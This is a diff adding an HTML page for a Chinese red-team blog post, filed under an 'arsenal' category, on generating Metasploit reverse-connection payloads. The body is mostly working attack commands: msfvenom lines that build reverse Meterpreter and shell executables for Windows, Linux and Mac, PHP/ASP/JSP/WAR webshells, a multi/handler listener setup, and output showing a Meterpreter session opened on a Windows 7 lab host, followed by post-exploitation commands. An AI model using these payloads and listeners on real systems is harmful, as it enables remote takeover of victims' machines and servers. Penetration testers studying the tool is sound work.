@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="saulGoodman">
+
+
+
+
+
+<title>Metasploit之各种Payload生成与实战作用详解（反向） | 渗透攻击红队-专注于渗透红队攻击</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">saulGoodman</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">saulGoodman</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Metasploit之各种Payload生成与实战作用详解（反向）</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">saulGoodman</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">October 9, 2019&nbsp;&nbsp;20:41:17</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E6%AD%A6%E5%99%A8%E5%BA%93/">武器库</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="Metasploit之各种Payload生成与实战作用详解（反向）"><a href="#Metasploit之各种Payload生成与实战作用详解（反向）" class="headerlink" title="Metasploit之各种Payload生成与实战作用详解（反向）"></a>Metasploit之各种Payload生成与实战作用详解（反向）</h2><blockquote>
+<p>Metasploit生成的Payload分为正向和反向，这篇文章讲的是反向，如下图</p>
+</blockquote>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/402.png" alt="图片"></p>
+<p>反向就是说<code>目标</code>执行了我们生成的<code>Payload</code>后，会主动连接我们的攻击服务器MSF</p>
+<h2 id="生成二进制文件"><a href="#生成二进制文件" class="headerlink" title="生成二进制文件"></a>生成二进制文件</h2><ul>
+<li><p>Windows</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure></li>
+<li><p>Linux</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure></li>
+<li><p>Mac</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="生成Webshell脚本"><a href="#生成Webshell脚本" class="headerlink" title="生成Webshell脚本"></a>生成Webshell脚本</h2><p>在做web渗透的时候，经常会⽤到<code>webshell</code>，我们经常⽤的⼀句话⽤菜⼑连接，如何使⽤<code>MSFVenom</code>⽣成⼀个可以<br>⽤msf操作的webshell呢？</p>
+<ul>
+<li>PHP</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port</span><br><span class="line">to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line"></span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo &#x27;&lt;?php &#x27; | tr -d &#x27;n&#x27; &gt; shell.php &amp;&amp; pbpaste &gt;&gt;</span><br><span class="line">shell.php</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>ASP</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your</span><br><span class="line">Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>JSP</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to</span><br><span class="line">Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>WAR</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to</span><br><span class="line">Connect On&gt; -f war &gt; shell.war</span><br></pre></td></tr></table></figure>
+
+<h2 id="如何生成Payload"><a href="#如何生成Payload" class="headerlink" title="如何生成Payload"></a>如何生成Payload</h2><p>用到的命令是<code>msfvenom</code>,具体可以看这篇文章：<a target="_blank" rel="noopener" href="http://www.liuwx.cn/metasploit-5.html">msfvenom-命令介绍</a></p>
+<ul>
+<li>LHOST </li>
+</ul>
+<blockquote>
+<p>填写的是攻击机器，也就是Kali的IP</p>
+</blockquote>
+<ul>
+<li>LPORT</li>
+</ul>
+<blockquote>
+<p>填写的是端口，一般填写的是高端口，如：6666、4444、8977等等，但是最好填写一下比较常用的端口，如：80、443、8080等等</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.136 LPORT=8080 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>
+
+<p>生成shell.exe：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@liuwx:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.136 LPORT=8080 -f exe &gt; shell.exe</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 341 bytes</span><br><span class="line">Final size of exe file: 73802 bytes</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>此时在当前目录下有一个<code>shell.exe</code>!</p>
+<p>因为在文章开头说了，这是反向连接，那么就需要先在攻击机器上监听，然后再然后肉鸡运行我们的文件才可以连接！</p>
+<h2 id="msfconsole接收"><a href="#msfconsole接收" class="headerlink" title="msfconsole接收"></a>msfconsole接收</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/404.png" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp //这个就是和上面msfvenom使用的payload是一样的</span><br><span class="line">set LHOST 192.168.119.136</span><br><span class="line">set LPORT 8080</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>接着我们放到<code>Windows7</code>下去执行这个二进制文件：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/403.png" alt="图片"></p>
+<p>最后，来看看<code>Metasploit</code>这边的监听情况：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/405.png" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.119.136:8080 </span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.119.139</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.119.136:8080 -&gt; 192.168.119.139:49213) at 2019-10-09 21:42:14 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>可以看到，<code>Windows7</code>运行了刚刚<code>msfvenom</code>生成的<code>shell.exe</code>后，<code>Metasploit</code>这边反弹了一个<code>meterpreter</code>会话过来！</p>
+<blockquote>
+<p>screenshot //截图当前桌面</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; screenshot</span><br><span class="line">Screenshot saved to: /root/BwCxBWYB.jpeg</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，使用<code>screenshot</code>后会在<code>/root/</code>下生成一个<code>BwCxBWYB.jpeg</code>的图片</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/406.png" alt="图片"></p>
+<p>这个就是这么一个<code>Windows</code>的<code>反向</code>cmdshell</p>
+<p>因为刚刚我们所反弹回来了一个shell，假设我们要重新监听其他的<code>payload</code>，那么就可以使用<code>background</code>来返回<code>msfconsole</code>控制台窗口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background </span><br><span class="line">[*] Backgrounding session 1...</span><br><span class="line">msf5 exploit(multi/handler) &gt; </span><br></pre></td></tr></table></figure>
+
+<p>如果想查看当前连接的肉鸡，就可以使用<code>sessions</code>查看在后台有哪些连接了<code>MSF</code>：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/407.png" alt="图片"></p>
+<p>如果想进入刚才那个<code>meterperter</code>，那么就<code>sessions</code>后面跟他的一个<code>id</code>：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/408.png" alt="图片"></p>
+<p>这样就进入了刚刚那个<code>cmdshell</code>里！</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>saulGoodman</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2019/10/09/metasploit-4/">http://example.com/2019/10/09/metasploit-4/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Metasploit/"># Metasploit</a>
+                    
+                        <a href="/tags/Kali-Linux/"># Kali Linux</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2019/10/10/metasploit-6/">Metasploit之各种Payload生成与实战作用详解（正向）</a>
+            
+            
+            <a class="next" rel="next" href="/2019/10/09/metasploit-5/">Metasploit：如何使用 - msfvenom</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© saulGoodman | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
